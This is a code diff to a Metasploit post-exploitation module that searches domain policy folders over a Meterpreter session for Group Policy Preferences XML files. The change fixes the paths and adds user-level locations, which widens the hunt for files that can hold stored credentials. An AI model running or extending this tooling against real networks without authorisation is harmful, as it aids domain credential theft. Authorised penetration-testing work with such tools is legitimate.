@@ -58,17 +58,20 @@ class Metasploit3 < Msf::Post
 	def run
 		dcs = []
 		group_paths = []
-		group_path = "Groups\\Groups.xml"
+		group_path = "MACHINE\\Preferences\\Groups\\Groups.xml"
+		group_path_user = "USER\\Preferences\\Groups\\Groups.xml"
 		service_paths = []
-		service_path = "Services\\Services.xml"
+		service_path = "MACHINE\\Preferences\\Services\\Services.xml"
 		printer_paths = []
-		printer_path = "Printers\\Printers.xml"
+		printer_path = "USER\\Preferences\\Printers\\Printers.xml"
 		drive_paths = []
-		drive_path = "Drives\\Drives.xml"
+		drive_path = "USER\\Preferences\\Drives\\Drives.xml"
 		datasource_paths = []
-		datasource_path = "Datasources\\DataSources.xml"
+		datasource_path = "MACHINE\\Preferences\\Datasources\\DataSources.xml"
+		datasource_path_user = "USER\\Preferences\\Datasources\\DataSources.xml"
 		task_paths = []
-		task_path = "ScheduledTasks\\ScheduledTasks.xml"
+		task_path = "MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
+		task_path_user = "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
 
 		if !datastore['DOMAINS'].to_s.empty?
 			user_domains = datastore['DOMAINS'].to_s.split(' ')
@@ -113,11 +116,14 @@ class Metasploit3 < Msf::Post
 							next if policy_dir =~ /^(\.|\.\.)$/
 							policy_path = "#{domain_path}\\#{policy_dir}"
 							group_paths << find_path(policy_path, group_path)
+							group_paths << find_path(policy_path, group_path_user)
 							service_paths << find_path(policy_path, service_path)
 							printer_paths << find_path(policy_path, printer_path)
 							drive_paths << find_path(policy_path, drive_path)
 							datasource_paths << find_path(policy_path, datasource_path)
+							datasource_paths << find_path(policy_path, datasource_path_user)
 							task_paths << find_path(policy_path, task_path)
+							task_paths << find_path(policy_path, task_path_user)
 						end
 					rescue Rex::Post::Meterpreter::RequestError => e
 						print_error "Received error code #{e.code} when reading #{tpath}"
@@ -173,7 +179,7 @@ class Metasploit3 < Msf::Post
 	end
 
 	def find_path(path, xml_path)
-		xml_path = "#{path}\\MACHINE\\Preferences\\#{xml_path}"
+		xml_path = "#{path}\\#{xml_path}"
 		begin
 			return xml_path if client.fs.file.stat(xml_path)
 		rescue Rex::Post::Meterpreter::RequestError => e
